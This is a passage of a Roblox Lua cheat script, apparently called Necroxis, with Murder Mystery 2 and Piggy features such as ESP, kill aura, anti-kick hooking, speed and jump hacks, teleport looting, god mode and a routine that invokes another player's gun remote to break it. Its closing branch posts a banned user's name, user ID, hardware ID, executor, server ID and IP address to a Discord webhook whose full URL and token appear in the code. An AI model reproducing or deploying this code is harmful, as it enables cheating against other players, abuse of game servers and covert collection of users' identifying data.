    billboard.FillColor = Color3.fromRGB(160, 160, 160)
    billboard.OutlineTransparency = 1
    billboard.Adornee = GetGunDrop()
    end
    end
else
    for i,v in pairs(workspace:GetChildren()) do
        for u,b in pairs(v:GetChildren()) do
        if b:FindFirstChild("HIGHLIGHT_BODY") ~= nil then b:FindFirstChild("HIGHLIGHT_BODY"):Destroy() end
        end
    end
    end
end

local Anti
Anti = hookmetamethod(game, "__namecall", function(self, ...)
        if self == lp and getnamecallmethod():lower() == "kick" then
            return warn("[ANTI-KICK] Client Tried To Call Kick Function On LocalPlayer")
        end
        return Anti(self, ...)
    end)
if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
runservice.Heartbeat:Connect(function(delay)
    wait(delay)
        if mm2_features["FakeSG"] then
        if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
        if mm2_features["WalkSpeed_Toggle"] then
            WalkSpeedTOGGLE:UpdateTGL()
        SendError("Deativate SpeedHack to Fix most Issues!")
        end
        if GetState() ~= "NoDetect" and GetState() == "Landed" or GetState() == "Freefall" then
        if lp.Character ~= nil and lp.Character.Humanoid ~= nil then
        lp.Character.Humanoid.WalkSpeed = 40
        end
        else
        if lp.Character ~= nil and lp.Character.Humanoid ~= nil then
        lp.Character.Humanoid.WalkSpeed = 16
        end
        end
        end
    end
    if mm2_features["AutoGetToys"] then
        if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
        if mm2_features["AutoGiveAE"] then
            GIVEEMOTE:UpdateTGL()
        SendError("Deativated Auto Get Emotes To Fix Issues!")
        end
        end
    end
    if mm2_features["AutoAvoidMurder"] then
        if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
    for _,m in pairs(game.Players:GetPlayers()) do
            if m ~= lp and m.Character then
            if m.Backpack:FindFirstChild("Knife") or m.Character:FindFirstChild("Knife") then
            local dis = (lp.Character.HumanoidRootPart.Position - m.Character.HumanoidRootPart.Position).Magnitude
            if dis < 21.5 then
            if not CoolDowned then
            CoolDowned = true
            lp.Character.HumanoidRootPart.CFrame = m.Character.HumanoidRootPart.CFrame * positioN
            wait(0.1)
            lp.Character.HumanoidRootPart.CFrame = lp.Character.HumanoidRootPart.CFrame * CFrame.new(0,0.00123,0)
            wait(2.3)
            CoolDowned = false
            end
            end
            end
            end
    end
    end
    end
    if mm2_features["AutoBreakGun"] then
        if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
        for i,Player in pairs(game.Players:GetPlayers()) do
        if Player ~= lp then
        if Player.Character:FindFirstChild("Gun") and Player.Character ~= nil or Player.Backpack:FindFirstChild("Gun") and Player.Character ~= nil then
            local Gun = Player.Character:FindFirstChild("Gun") or Player.Backpack:FindFirstChild("Gun") -- to prevent yielding
            if Gun and Gun:FindFirstChild("KnifeServer") ~= nil then -- check for the remote folder
                local Success, Error = pcall(Gun.KnifeServer.ShootGun.InvokeServer, Gun.KnifeServer.ShootGun, 0, CFrame.new(), "AH2") -- handle the error itself!
                if not Success and Error then
                    SendNotification("Succesful Breaked The Gun From Sheriff!")
                end
                repeat task.wait() until Player == nil or Player.Character == nil or Player.Character.Humanoid.Health == 0
            end
        end
        end
        end
end
    end
    if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
    if mm2_features["AntiVoidDeath"] then
    workspace.FallenPartsDestroyHeight = -math.huge
    else
    workspace.FallenPartsDestroyHeight = -500
    end
    end
    if mm2_features["Spinner"] then
        if lp.Character ~= nil and lp.Character.HumanoidRootPart ~= nil then
            if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
            lp.Character.HumanoidRootPart.CFrame = lp.Character.HumanoidRootPart.CFrame * CFrame.fromEulerAnglesXYZ(0,2 * mm2_features["SpinPower"],0,0)
            end
   end
    end
    if mm2_features["TrapsRemover"] then
        if IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
							for _, Y in pairs(workspace:GetChildren()) do
									for _, N in pairs(Y:GetChildren()) do
										if N.Name == "Trap" and N:IsA("Model") then
											N:Destroy()
										end
									end
								end
							end
        end
end)
end
while true do task.wait(0.0000009269)
pcall(function()
    roles = replst:FindFirstChild("GetPlayerData", true):InvokeServer()
        if roles ~= nil then
        for i,v in pairs(roles) do
        if v.Role == "Murderer" then
        Murder = i
        elseif v.Role == "Sheriff" then
        Sheriff = i
        elseif v.Role == "Hero" then
        Hero = i
        end
        end
        end
    for i, v in pairs(folder:GetChildren()) do
        if v:IsA("BillboardGui") and game:GetService("Players")[tostring(v.Name)] then
        if mm2_features["Esp_All"] then
        v.Enabled = true
        else
            v.Enabled = false
        end
        end
    end
    for i, v in pairs(folder:GetChildren()) do
            if v:IsA("BillboardGui") and Players[tostring(v.Name)] then
            if v.Name == Murder then
            if mm2_features["Esp_Murder"] then
            v.Enabled = true
            else
                v.Enabled = false
            end
            end
            end
    end
    for i, v in pairs(folder:GetChildren()) do
            if v:IsA("BillboardGui") and Players[tostring(v.Name)] then
            if v.Name == Sheriff or v.Name == Hero then
            if mm2_features["Esp_Sheriff"] then
            v.Enabled = true
            else
                v.Enabled = false
            end
            end
            end
    end
    if mm2_features["Highlight_All"] then
        CreateHighlight()
	    UpdateHighlights()
    else
        HideHighlights()
    end
    MoreBypass()
    if mm2_features["KillAura"] then
					for o, Y in pairs(game.Players:GetPlayers()) do
						if Y.Name ~= lp.Name and IsAlive(Y) and Y.Character ~= nil and Y.Character.HumanoidRootPart ~= nil and lp.Character ~= nil and lp.Character.HumanoidRootPart ~= nil then
							local b = (Y.Character.HumanoidRootPart.Position - lp.Character.HumanoidRootPart.Position).Magnitude
							if b < mm2_features["KnifeRange"] then
									for n, j in pairs(lp.Character:GetChildren()) do
										if j.Name == "Knife" then
											TouchKn(Y, j)
										end
									end
								end
							end
		end

	end
    if mm2_features["WalkSpeed_Toggle"] and lp.Character ~= nil and lp.Character.Humanoid ~= nil then
        if IsPremium(lp) then
            if mm2_features["FakeSG"] then
                WalkSpeedTOGGLE:UpdateTGL()
                SendError("Cannot Activate SpeedHack! Reason: Fake Speed Glitch Is Turned On!")
            else
                lp.Character.Humanoid.WalkSpeed = mm2_features["WalkSpeed_Value"]
            end
        else
            lp.Character.Humanoid.WalkSpeed = mm2_features["WalkSpeed_Value"]
        end
    else
        lp.Character.Humanoid.WalkSpeed = 16
    end
    if mm2_features["JumpPower_Toggle"] and lp.Character ~= nil and lp.Character.Humanoid ~= nil then
        lp.Character.Humanoid.JumpPower = mm2_features["JumpPower_Value"]
    else
        lp.Character.Humanoid.JumpPower = 50
    end
    if mm2_features["Fov_Toggle"] and lp.Character ~= nil and lp.Character.Humanoid ~= nil then
        workspace.CurrentCamera.FieldOfView = mm2_features["Fov_Value"]
    else
        workspace.CurrentCamera.FieldOfView = 75
    end
    if mm2_features["Float_Toggle"] then
        if workspace:FindFirstChild("FloatExploit") then
            workspace.FloatExploit:Destroy()
            end
            local Float = Instance.new("Part", workspace)
            Float.Anchored = true
            Float.Name = "FloatExploit"
            Float.Transparency = 1
            Float.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.18, 0)
            Float.Size = Vector3.new(15,0,15)
    else
        if workspace:FindFirstChild("FloatExploit") then
            workspace.FloatExploit:Destroy()
            end
    end
    if mm2_features["LoopInteract_Toggle"] then
        for o, Y in pairs(workspace:GetDescendants()) do
            if Y.Name == "Interact" and Y:IsA("RemoteEvent") and Y.Parent.Name ~= "AccessibleTestTube" and Y.Parent.Parent.Name ~= "AccessibleTestTube" and Y.Parent.Parent.Parent.Name ~= "AccessibleTestTube" then
            Y:FireServer()
            end
            end
    end

    if mm2_features["BodyRemover_Toggle"] then
        for _,v in pairs(workspace:GetChildren()) do
            for g,h in pairs(v:GetChildren()) do
            if h.Name == "Raggy" then h:Destroy() end
            end
        end
    end
end)
end

elseif table.find(PlaceIds.MMV, game.PlaceId) then

elseif table.find(PlaceIds.Piggy, game.PlaceId) then
    UILIB:Load("Necroxis Piggy", V)
local Tabs = {
    ["Main"] = UILIB.newTab("Main", icns.assets["lucide-home"]),
    ["Player"] = UILIB.newTab("User", icns.assets["lucide-user"]),
}
KeybindConnect = UserInputService.InputBegan:Connect(function(input, gameProcessed)

        if input.KeyCode == Enum.KeyCode.Tab then

        UILIB:Toggle()
        end
    end)
    local function UpdateItems()
        piggy_features.Items_Table.Items = {}
for i,v in pairs(workspace:GetChildren()) do 
if v:IsA("Folder") then
for i2,v2 in pairs(v:GetDescendants()) do 
if v2:IsA("Script") and v2.Name =="ItemPickupScript" then
    
table.insert(piggy_features.Items_Table.Items,1,v2.Parent)
			end
	end
	end
end
end
local function GodMode(boolan)
    wait()
game.Players.LocalPlayer.Character.Head.CanTouch = boolan
game.Players.LocalPlayer.Character.LeftFoot.CanTouch = boolan
game.Players.LocalPlayer.Character.RightFoot.CanTouch = boolan
game.Players.LocalPlayer.Character.RightHand.CanTouch = boolan
game.Players.LocalPlayer.Character.LeftHand.CanTouch = boolan
game.Players.LocalPlayer.Character.RightLowerLeg.CanTouch = boolan
game.Players.LocalPlayer.Character.RightUpperLeg.CanTouch = boolan
game.Players.LocalPlayer.Character.LeftLowerLeg.CanTouch = boolan
game.Players.LocalPlayer.Character.LeftUpperLeg.CanTouch = boolan
game.Players.LocalPlayer.Character.LeftLowerArm.CanTouch = boolan
game.Players.LocalPlayer.Character.LeftUpperArm.CanTouch = boolan
game.Players.LocalPlayer.Character.RightUpperArm.CanTouch = boolan
game.Players.LocalPlayer.Character.RightLowerArm.CanTouch = boolan
game.Players.LocalPlayer.Character.UpperTorso.CanTouch = boolan
game.Players.LocalPlayer.Character.LowerTorso.CanTouch = boolan
game.Players.LocalPlayer.Character.HumanoidRootPart.CanTouch = boolan
print ("h")
    end
do
    local toggleguiforclose = Instance.new("ScreenGui")

    toggleguiforclose.Name = "ToggleUi"
toggleguiforclose.DisplayOrder = math.huge
    toggleguiforclose.Parent = lp.PlayerGui
    toggleguiforclose.ResetOnSpawn = false
    
    local toggletohideui = Instance.new("ImageButton")
    toggletohideui.Name = "HideButton"
    toggletohideui.Size = UDim2.new(0.06, 0, 0.14, 0)
    --toggletohideui.Position = UDim2.new(0.01001973976, 0, 0.37, 0)
    toggletohideui.BackgroundColor3 = Color3.fromRGB(28,28,28)
    toggletohideui.Active = true
    toggletohideui.Draggable = true
    toggletohideui.Parent = toggleguiforclose
    toggletohideui.Image = "rbxassetid://80367453324417"
    toggletohideui.ZIndex = math.huge
    
    local uicor = Instance.new("UICorner", toggletohideui)
    uicor.CornerRadius = UDim.new(1,0)
    
    toggletohideui.MouseButton1Click:Connect(function()
        UILIB:Toggle()
    end)
    end
local lp = game.Players.LocalPlayer
local lastpsm = nil

local EVPF = Tabs.Main.newVPF("Items",piggy_features.Items_Table.Items,function(instance)
    if lastpsm == nil then

        

        lastpsm = lp.Character.HumanoidRootPart.CFrame
    end
    
    lp.Character.HumanoidRootPart.CFrame = instance.CFrame
    task.wait(.1)
    repeat
fireclickdetector(instance:FindFirstChildOfClass("ClickDetector"))
task.wait(.01)
until not instance:FindFirstChildOfClass("ClickDetector")


    print(instance.Name)
            wait(.3)
            
lp.Character.HumanoidRootPart.CFrame = lastpsm
            lastpsm = nil


end)
Tabs.Player.newToggle("God Mode",false, function(b)

    piggy_features.GodMode = b

    end)
Tabs.Main.newToggle("Auto Update Items List",false, function(b)
    piggy_features.Items_Table.AutoUpdate = b
    end)
Tabs.Main.newButton("Update Items List",function()
    print("updating")
    print(unpack(piggy_features.Items_Table.Items))
    UpdateItems()
    EVPF:Change(piggy_features.Items_Table.Items)
    
end)
task.defer(function()
while wait(1) do 
    if piggy_features.Items_Table.AutoUpdate then
        UpdateItems()

    EVPF:Change(piggy_features.Items_Table.Items)
        end
end
end)
task.defer(function()
while piggy_features.GodMode do
    GodMode(piggy_features.GodMode)
    end
end)
elseif table.find(PlacedIds.Doors, game.PlaceId) then
    local Mode;
    if game.PlaceId == idk then
        Mode = "Hotel"
    elseif game.PlaceId == idk then
        Mode = "OldHotel"
    elseif game.PlaceId == idk then
        Mode = "SHM"
    elseif game.PlaceId == idk then
        Mode = "Backdoor"
    elseif game.PlaceId == idk then
        Mode = "Rooms"
    elseif game.PlaceId == idk then
        Mode = "HotelBad"
    elseif game.PlaceId == idk then
        Mode = "TheMines"
    end
    SendError("Beta Version Is Not Ready(not done)!")
    G2L["1"]:Destroy()
else
    SendError("Beta Version Doesnt Supports This Game!")
    G2L["1"]:Destroy()
    return
end
else
    SendDiscord("https://discord.com/api/webhooks/1320587452104310808/73hVfckGSufFungDVox3_jOtGvpUAjQYM3fHQHVi-QPnJ9-0yjpvI9hkaXiFvBYQAUjf", "** **", "API[BannedUser]","", "User Tried To Load Script, But He Got Banned!", "https://web.roblox.com/users/" .. lp.UserId .. "/profile", {
                {
                    ["name"] = "User:",
                    ["value"] = lp.Name.." (" ..lp.DisplayName.. ")["..lp.UserId.."]",
                    ["inline"] = true,
                },
                {
                    ["name"] = "HWID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true,
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = getexecutorname(),
                    ["inline"] = true,
                },
                {
                    ["name"] = "Server Id:",
                    ["value"] = game.JobId,
                    ["inline"] = true,
                },
                {
                    ["name"] = "IP:",
                    ["value"] = getip,
                    ["inline"] = true,
                },
                {
                    ["name"] = "Game: ",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true,
                }
            })
    lp:Kick("You have been banned from Necroxis 🤡📸👍")
end